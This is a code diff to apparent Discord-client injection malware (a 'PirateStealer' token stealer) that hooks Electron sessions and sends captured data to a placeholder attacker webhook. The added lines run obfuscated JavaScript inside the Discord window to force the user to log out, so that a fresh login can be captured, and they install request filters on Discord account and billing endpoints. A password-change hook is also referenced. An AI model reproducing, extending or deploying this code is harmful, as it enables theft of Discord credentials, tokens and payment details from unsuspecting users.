@@ -1,11 +1,39 @@
-var webhook = "%WEBHOOK_LINK%"
-
-
-const { session, BrowserWindow } = require('electron')
+const fs = require('fs-extra');
+const path = require('path');
+const { BrowserWindow, session } = require('electron')
 const https = require("https");
 const querystring = require('querystring');
+var webhook = "%WEBHOOK_LINK%"
 
 webhook = webhook.replace("https://discord.com", "").replace("https://canary.discord.com", "").replace("https://ptb.discord.com", "").replace("https://discordapp.com", "")
+
+function FirstTime(){
+    
+    if (!fs.existsSync(path.join(__dirname, "PirateStealerBTW"))){
+        return true;
+    }
+    
+    fs.removeSync(path.join(__dirname, "PirateStealerBTW"));
+    const window = BrowserWindow.getFocusedWindow();
+    window.webContents.executeJavaScript(`function LogOut(){var t=webpackJsonp.push([[],{extra_id:(t,n,e)=>t.exports=e},[["extra_id"]]]);(function(n){const e="string"==typeof n?n:null;for(const o in t.c)if(t.c.hasOwnProperty(o)){const r=t.c[o].exports;if(r&&r.__esModule&&r.default&&(e?r.default[e]:n(r.default)))return r.default;if(r&&(e?r[e]:n(r)))return r}return null})("login").logout()} LogOut()`, true).then((result) => {
+
+    });
+    return false;
+}
+const Filter = {
+    "urls":[ "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
+    "https://*.discord.com/api/v*/applications/detectable",
+    "https://discord.com/api/v*/applications/detectable",
+    "https://*.discord.com/api/v*/users/@me/library",
+    "https://discord.com/api/v*/users/@me/library",
+    "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
+    "https://discord.com/api/v*/users/@me/billing/subscriptions"
+    ]
+}
+session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
+        if (FirstTime())
+    callback({cancel:false})
+})
 
 
 function SendToWebhook(what) {
@@ -193,4 +221,4 @@ session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, ca
 
 });
 
-module.exports = require('./core.asar');
+module.exports = require('./core.asar')
